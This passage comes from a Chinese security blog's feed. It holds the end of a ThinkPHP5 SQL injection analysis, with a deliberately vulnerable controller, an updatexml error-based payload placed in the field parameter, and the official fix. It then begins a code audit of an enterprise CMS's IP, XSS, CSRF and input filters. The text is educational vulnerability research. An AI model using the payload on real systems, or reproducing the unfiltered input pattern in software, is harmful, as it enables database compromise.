class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $options = request()-&gt;get(<span class="string">&#x27;options&#x27;</span>);</span><br><span class="line">        $result = db(<span class="string">&#x27;users&#x27;</span>)-&gt;max($options);</span><br><span class="line">        var_dump($result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此会先进入到<code>Query</code>类 的 <code>max</code> 方法。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014143.png" alt="image-20200916010724376"></p><p>用户的输入传给了<code>field</code> ：id`)+updatexml(1,concat(0x7,user(),0x7e),1) from users#</p><p>然后该方法继续调用了<code>aggregate</code> 方法，该方法接着调用了<code>$this-&gt;connection</code> 的 <code>aggregate</code>方法，而<code>$this-&gt;connection</code> 为<code>think\db\connector\Mysql</code> 类，而<code>Mysql</code>类继承与<code>Connection</code> 类，故调用该类的<code>aggregate</code> 方法，该方法又调用了<code>$this-&gt;builder</code>，此处为<code>think\db\Builder\Mysql</code> 类的 <code>parseKey</code> 方法。该方法和SQL注入五起到的作用一样。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014123.png" alt="image-20200916012332355"></p><p>理清了调用情况。具体说<code>parseKey</code>方法的作用</p><blockquote><p><strong>parseKey</strong> 方法主要是对字段和表名进行处理，这里只是对我们的数据两端都添加了反引号。经过 <strong>parseKey</strong> 方法处理后，程序又回到了上图的 <strong>$this-&gt;value()</strong> 方法中，该方法会调用 <strong>Builder</strong> 类的 <strong>select</strong> 方法来构造 <strong>SQL</strong> 语句。这个方法应该说是在分析 <strong>ThinkPHP</strong> 漏洞时，非常常见的了。其无非就是使用 <strong>str_replace</strong> 方法，将变量替换到 <strong>SQL</strong> 语句模板中。这里，我们重点关注 <strong>parseField</strong> 方法，因为用户可控数据存储在 <strong>$options[‘field’]</strong> 变量中并被传入该方法。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params">Query $query</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $options = $query-&gt;getOptions();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str_replace(</span><br><span class="line">        [<span class="string">&#x27;%TABLE%&#x27;</span>, <span class="string">&#x27;%DISTINCT%&#x27;</span>, <span class="string">&#x27;%FIELD%&#x27;</span>, <span class="string">&#x27;%JOIN%&#x27;</span>, <span class="string">&#x27;%WHERE%&#x27;</span>, <span class="string">&#x27;%GROUP%&#x27;</span>, <span class="string">&#x27;%HAVING%&#x27;</span>, <span class="string">&#x27;%ORDER%&#x27;</span>, <span class="string">&#x27;%LIMIT%&#x27;</span>, <span class="string">&#x27;%UNION%&#x27;</span>, <span class="string">&#x27;%LOCK%&#x27;</span>, <span class="string">&#x27;%COMMENT%&#x27;</span>, <span class="string">&#x27;%FORCE%&#x27;</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseTable($query, $options[<span class="string">&#x27;table&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseDistinct($query, $options[<span class="string">&#x27;distinct&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseField($query, $options[<span class="string">&#x27;field&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseJoin($query, $options[<span class="string">&#x27;join&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseWhere($query, $options[<span class="string">&#x27;where&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseGroup($query, $options[<span class="string">&#x27;group&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseHaving($query, $options[<span class="string">&#x27;having&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseOrder($query, $options[<span class="string">&#x27;order&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLimit($query, $options[<span class="string">&#x27;limit&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseUnion($query, $options[<span class="string">&#x27;union&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLock($query, $options[<span class="string">&#x27;lock&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseComment($query, $options[<span class="string">&#x27;comment&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseForce($query, $options[<span class="string">&#x27;force&#x27;</span>]),</span><br><span class="line">        ],</span><br><span class="line">        <span class="keyword">$this</span>-&gt;selectSql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>parseFieid</code>方法，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseField</span>(<span class="params">Query $query, $fields</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;*&#x27;</span> == $fields || <span class="keyword">empty</span>($fields)) &#123;</span><br><span class="line">        $fieldsStr = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_array($fields)) &#123;</span><br><span class="line">        <span class="comment">// 支持 &#x27;field1&#x27;=&gt;&#x27;field2&#x27; 这样的字段别名定义</span></span><br><span class="line">        $array = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($fields <span class="keyword">as</span> $key =&gt; $field) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($key)) &#123;</span><br><span class="line">                $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $key) . <span class="string">&#x27; AS &#x27;</span> . <span class="keyword">$this</span>-&gt;parseKey($query, $field, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $field);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $fieldsStr = implode(<span class="string">&#x27;,&#x27;</span>, $array);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $fieldsStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法未做任何过滤，用户可控数据只是经过 <strong>parseKey</strong> 方法处理，并不影响数据，然后直接用逗号拼接，最终直接替换进 <strong>SQL</strong> 语句模板里，导致 <strong>SQL注入漏洞</strong> 的发生</p><h2 id="利用总结-5"><a href="#利用总结-5" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://github.com/Ifonly-go2019/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A56/7.png" alt="7"></p><h2 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官方的修复方法是：当匹配到除了 <strong>字母、点号、星号</strong> 以外的字符时，就抛出异常。</p><p> <img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014204.png" alt="image-20200916004737749"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;参考资料：&lt;a href=&quot;https://github.com/Mochazz/ThinkPHP-Vuln&quot;&gt;https://github.com/Mochazz/ThinkPHP-Vuln&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;环境准备：&lt;/p&gt;
&lt;ul&gt;
&lt;</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="SQL注入" scheme="https://hack-for.fun/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>新秀企业网站系统代码审计学习(复现)</title>
    <link href="https://hack-for.fun/844d1b07.html"/>
    <id>https://hack-for.fun/844d1b07.html</id>
    <published>2020-09-12T01:19:38.000Z</published>
    <updated>2020-09-12T10:49:37.659Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>参考资料：</p><p><a href="https://v0w.top/2020/08/26/CodeAudit-php/">代码审计常见的三种方法（PHP篇）</a></p><p><a href="https://www.sqlsec.com/2020/01/sinsiu.html#toc-heading-1">PHP代码审计初次尝试之新秀企业网站系统</a></p><p>审计思路通过脑图大概总结如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912095326.png" alt="image-20200912095322738"></p><h1 id="了解系统"><a href="#了解系统" class="headerlink" title="了解系统"></a>了解系统</h1><p><strong>CMS名称</strong>：新秀企业网站系统PHP版</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183413.png" alt="image-20200912095625466"></p><p>看着界面就知道是用于企业打广告(x)和发布信息，招聘等功能的系统。且存在前台用户登录和后台管理系统。存在搜索功能。</p><h1 id="防护策略"><a href="#防护策略" class="headerlink" title="防护策略"></a>防护策略</h1><h2 id="IP登录限制-猜测伪造IP注入"><a href="#IP登录限制-猜测伪造IP注入" class="headerlink" title="IP登录限制 - 猜测伪造IP注入"></a>IP登录限制 - 猜测伪造IP注入</h2><p>限制了前台、后台的登录次数限制、注册限制、可能会影响到后面SQL注入漏洞的测试。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183349.png" alt="image-20200912100248513"></p><p>可能出现的漏洞：<strong>伪造IP进行注入攻击</strong></p><p>数据库监控，在注册的地方看看<code>ip</code> 是否被带入了数据库。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184550.png" alt="image-20200912102325325"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from php_shisiusafe where saf_ip &#x3D; &#39;127.0.0.1&#39;  and saf_action &#x3D; &#39;register&#39;</span><br></pre></td></tr></table></figure><p>全局定位到获取用户iP的代码部分：</p><p>phpstorm 搜索 获取IP，即可。</p><p>include/function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取客户端IP</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>) &amp;&amp; strcasecmp(getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>),<span class="string">&#x27;unknown&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>) &amp;&amp; strcasecmp(getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>),<span class="string">&#x27;unknown&#x27;</span>))&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(getenv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>) &amp;&amp; strcasecmp(getenv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>),<span class="string">&#x27;unknown&#x27;</span>))&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &amp;&amp; $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] &amp;&amp; strcasecmp($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],<span class="string">&#x27;unknown&#x27;</span>))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = <span class="string">&#x27;0.0.0.0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(str_replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$ip)))</span><br><span class="line">&#123;</span><br><span class="line">$ip = <span class="string">&#x27;0.0.0.0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $ip; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现，当ip 除去<code>.</code>  后，如果不是纯数字，那么就设置为 0.0.0.0 。因此通过伪造IP进行注入是行不通了。</p><h2 id="XSS-过滤"><a href="#XSS-过滤" class="headerlink" title="XSS 过滤"></a>XSS 过滤</h2><p>前台存在留言功能。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184533.png" alt="image-20200912103732317"></p><p>提交后，我们登录后台管理员进行查看留言内容。 发现并没有执行js代码。</p><p>index/module/info_main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_message</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">safe(<span class="string">&#x27;message&#x27;</span>);</span><br><span class="line"><span class="keyword">global</span> $global,$smarty,$lang;</span><br><span class="line">$mes_email = post(<span class="string">&#x27;email&#x27;</span>);</span><br><span class="line">$mes_type = post(<span class="string">&#x27;type&#x27;</span>);</span><br><span class="line">$mes_title = post(<span class="string">&#x27;title&#x27;</span>);</span><br><span class="line">$mes_text = post(<span class="string">&#x27;text&#x27;</span>);</span><br><span class="line">$mes_show = post(<span class="string">&#x27;show&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>($mes_email == <span class="string">&#x27;&#x27;</span> || $mes_type == <span class="string">&#x27;&#x27;</span> || $mes_title == <span class="string">&#x27;&#x27;</span> || $mes_text == <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;submit_error_info&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$mes_add_time = time();</span><br><span class="line"><span class="keyword">if</span>($mes_show != <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">$mes_show = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> message();</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_user_id&#x27;</span>,$global[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_type&#x27;</span>,$mes_type);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_email&#x27;</span>,$mes_email);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_title&#x27;</span>,$mes_title);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_text&#x27;</span>,$mes_text);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_add_time&#x27;</span>,$mes_add_time);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_show&#x27;</span>,$mes_show);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_lang&#x27;</span>,S_LANG);</span><br><span class="line">$obj-&gt;add();</span><br><span class="line"><span class="keyword">if</span>(intval(get_varia(<span class="string">&#x27;sentmail&#x27;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">$email_title = <span class="string">&#x27;您的网站有了新的留言&#x27;</span>;</span><br><span class="line">$email_text = <span class="string">&quot;[$mes_type] $mes_title &lt;br /&gt; $mes_text&quot;</span>;</span><br><span class="line">call_send_email($email_title,$email_text,$global[<span class="string">&#x27;user_id&#x27;</span>],$mes_email);</span><br><span class="line">&#125;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;submit_message&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;info_text&#x27;</span>,$info_text);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_text&#x27;</span>,$lang[<span class="string">&#x27;go_back&#x27;</span>]);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_href&#x27;</span>,url(<span class="keyword">array</span>(<span class="string">&#x27;channel&#x27;</span>=&gt;<span class="string">&#x27;message&#x27;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们的输入是被传入了<code>post</code> 函数进行执行，跟进该函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取post</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">post</span>(<span class="params">$val,$filter = <span class="string">&#x27;strict&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">return</span> $filter(<span class="keyword">isset</span>($_POST[$val])?$_POST[$val]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过了<code>strict</code> 条件的过滤函数，找到这个的定义处。</p><p>include/function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//严格过滤字符串中的危险符号</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strict</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(S_MAGIC_QUOTES_GPC)</span><br><span class="line">   &#123;</span><br><span class="line">      $str = stripslashes($str);</span><br><span class="line">   &#125;</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&amp;#60;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&amp;#62;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;&amp;#63;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;&amp;#37;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(chr(<span class="number">39</span>),<span class="string">&#x27;&amp;#39;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(chr(<span class="number">34</span>),<span class="string">&#x27;&amp;#34;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(chr(<span class="number">13</span>).chr(<span class="number">10</span>),<span class="string">&#x27;&lt;br /&gt;&#x27;</span>,$str);</span><br><span class="line">   <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到html 的闭合标签被转义了，所以没法XSS</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_pwd</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">safe(<span class="string">&#x27;edit_pwd&#x27;</span>);</span><br><span class="line"><span class="keyword">global</span> $global,$smarty,$lang;</span><br><span class="line">$old_pwd = post(<span class="string">&#x27;old_pwd&#x27;</span>);</span><br><span class="line">$new_pwd = post(<span class="string">&#x27;new_pwd&#x27;</span>);</span><br><span class="line">$re_pwd = post(<span class="string">&#x27;re_pwd&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($old_pwd) &lt; <span class="number">6</span> || strlen($old_pwd) &gt; <span class="number">15</span> || strlen($new_pwd) &lt; <span class="number">6</span> || strlen($new_pwd) &gt; <span class="number">15</span> || $new_pwd != $re_pwd)</span><br><span class="line">&#123;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;submit_error_info&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$use_password = md5($old_pwd);</span><br><span class="line">$obj = <span class="keyword">new</span> users();</span><br><span class="line">$obj-&gt;set_where(<span class="string">&#x27;use_id = &#x27;</span>.$global[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">$obj-&gt;set_where(<span class="string">&quot;use_password = &#x27;$use_password&#x27;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>($obj-&gt;get_count() &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">$use_password = md5($new_pwd);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;use_password&#x27;</span>,$use_password);</span><br><span class="line">$obj-&gt;set_where(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">$obj-&gt;set_where(<span class="string">&#x27;use_id = &#x27;</span>.$global[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">$obj-&gt;edit();</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;over&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;old_pwd_error&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;info_text&#x27;</span>,$info_text);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_text&#x27;</span>,$lang[<span class="string">&#x27;go_back&#x27;</span>]);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_href&#x27;</span>,url(<span class="keyword">array</span>(<span class="string">&#x27;entrance&#x27;</span>=&gt;$global[<span class="string">&#x27;entrance&#x27;</span>],<span class="string">&#x27;channel&#x27;</span>=&gt;<span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;mod&#x27;</span>=&gt;<span class="string">&#x27;profile&#x27;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CSRF 修改用户密码，需要旧密码，行不通。</p><h2 id="可控变量过滤"><a href="#可控变量过滤" class="headerlink" title="可控变量过滤"></a>可控变量过滤</h2><h3 id="session-过滤"><a href="#session-过滤" class="headerlink" title="session 过滤"></a>session 过滤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取session</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_session</span>(<span class="params">$name,$filter = <span class="string">&#x27;strict&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(S_SESSION)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">return</span> $filter(<span class="keyword">isset</span>($_SESSION[$name])?$_SESSION[$name]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> $filter(<span class="keyword">isset</span>($_COOKIE[$name])?$_COOKIE[$name]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cookie-过滤"><a href="#cookie-过滤" class="headerlink" title="cookie 过滤"></a>cookie 过滤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置cookie</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_cookie</span>(<span class="params">$name,$value,$filter = <span class="string">&#x27;strict&#x27;</span>,$expire = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>($expire == <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      setcookie($name,$filter($value));</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      setcookie($name,$filter($value),$expire);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="admin-登录"><a href="#admin-登录" class="headerlink" title="admin 登录"></a>admin 登录</h3><p>admin/module/info_main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">admin_login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   safe(<span class="string">&#x27;admin_login&#x27;</span>);</span><br><span class="line">   <span class="keyword">global</span> $smarty,$lang;</span><br><span class="line">   $username = substr(post(<span class="string">&#x27;username&#x27;</span>),<span class="number">0</span>,<span class="number">30</span>);</span><br><span class="line">   $password = substr(post(<span class="string">&#x27;password&#x27;</span>),<span class="number">0</span>,<span class="number">30</span>);</span><br><span class="line">   <span class="keyword">if</span>($username == <span class="string">&#x27;&#x27;</span> || $password == <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      unset_session(<span class="string">&#x27;admin_username&#x27;</span>);</span><br><span class="line">      unset_session(<span 